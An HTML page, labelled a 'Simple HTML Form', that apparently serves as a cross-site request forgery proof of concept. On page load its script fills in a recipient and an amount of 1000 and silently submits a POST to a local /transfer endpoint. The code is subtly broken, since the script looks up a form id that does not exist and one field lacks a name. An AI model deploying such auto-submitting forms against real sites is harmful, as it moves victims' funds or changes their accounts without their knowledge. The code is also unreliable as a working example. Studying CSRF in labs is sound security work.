<!DOCTYPE html>
<html lang="en">
<head>
    <title>HTML Form</title>
</head>
<body>
    <h1>Simple HTML Form</h1>

    
    <form id="form" action="https://127.0.0.1:8080/transfer" method="POST">

       
        <input type="text" class="form-control" id="inputTo"><br><br>

       
        <input type="number" class="form-control" id="inputAmount" name="amount"><br><br>

        <input type="submit" value="Submit">

    </form> 

    <script>
        window.onload = function() {
            // Populate form fields
            document.getElementById('inputTo').value = 'aps';
            document.getElementById('inputAmount').value = '1000'; // Assuming default amount is 1000

            // Automatically submit the form
            document.getElementById('transferForm').submit();
        };
    </script>

</body>
</html>
